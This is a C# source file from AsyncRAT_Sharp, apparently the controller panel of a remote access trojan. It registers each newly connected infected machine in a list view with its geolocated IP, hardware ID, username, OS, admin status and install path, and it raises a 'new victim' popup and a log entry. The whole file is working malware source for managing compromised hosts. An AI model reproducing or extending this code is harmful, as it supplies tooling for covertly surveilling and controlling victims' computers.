using System;
using AsyncRAT_Sharp.MessagePack;
using AsyncRAT_Sharp.Sockets;
using cGeoIp;
using System.Drawing;
using System.Windows.Forms;
using Tulpep.NotificationWindow;

namespace AsyncRAT_Sharp.Handle_Packet
{
    public class HandleListView
    {
        public void AddToListview(Clients client, MsgPack unpack_msgpack)
        {
            if (Program.form1.listView1.InvokeRequired)
            {
                try
                {
                    Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
                    {
                        client.LV = new ListViewItem();
                        client.LV.Tag = client;
                        client.LV.Text = string.Format("{0}:{1}", client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0], client.ClientSocket.LocalEndPoint.ToString().Split(':')[1]);
                        string[] ipinf;
                        try
                        {
                           ipinf = new cGeoMain().GetIpInf(client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]).Split(':');
                        }
                        catch { ipinf = new string[] { "?", "?" }; }
                        client.LV.SubItems.Add(ipinf[1]);
                        client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
                        client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
                        client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
                        client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Version").AsString);
                        client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Performance").AsString);
                        client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Admin").AsString);
                        client.LV.ToolTipText = "[Path] " + unpack_msgpack.ForcePathObject("Path").AsString + Environment.NewLine;
                        client.LV.ToolTipText += "[Pastebin] " + unpack_msgpack.ForcePathObject("Pastebin").AsString;

                        client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;
                        Program.form1.listView1.Items.Add(client.LV);
                        Program.form1.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                        if (Properties.Settings.Default.Notification == true)
                        {
                            PopupNotifier PN = new PopupNotifier();
                            PN.TitleText = "new victim";
                            PN.Image = AsyncRAT_Sharp.Properties.Resources.arrive;
                            PN.ImageSize = new Size(69, 68);
                            PN.ContentText = "IP : " + string.Format("{0}:{1}", client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0], client.ClientSocket.LocalEndPoint.ToString().Split(':')[1]) + "\n" +
                                "User : " + unpack_msgpack.ForcePathObject("User").AsString + "\n" +
                                "OS : " + unpack_msgpack.ForcePathObject("OS").AsString;
                            PN.Size = new Size(225, 104);
                            PN.Popup();
                        }
                    }));
                    lock (Settings.Online)
                    {
                        Settings.Online.Add(client);
                    }
                    new HandleLogs().Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} connected successfully", Color.Green);
                }
                catch { }
            }
        }

        public void Received(Clients client)
        {
            if (Program.form1.listView1.InvokeRequired)
            {
                Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
                {
                    client.LV.ForeColor = Color.Empty;
                }));
            }
        }
    }
}
